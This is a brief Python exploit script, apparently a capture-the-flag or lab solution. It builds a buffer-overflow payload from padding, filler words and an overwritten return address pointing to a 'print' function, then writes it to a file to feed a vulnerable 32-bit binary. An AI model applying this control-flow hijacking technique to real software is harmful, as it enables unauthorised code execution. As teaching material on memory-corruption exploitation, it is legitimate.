# 0xffffc4d4 // first read
# 0xffffc4d8 // second read
# 0x080484f1 // Direccion del print

exploit = b'\x02\x04\x00\x80'
exploit += b'\x42\x00\x00\x00' * 1000
exploit += b'\xCE\xFA\xC0\xCA' * 24
exploit += b'AAAA'
exploit += b'\xf1\x84\04\x08'

f = open('asd2.txt', 'wb+')
f.write(exploit)
f.close()
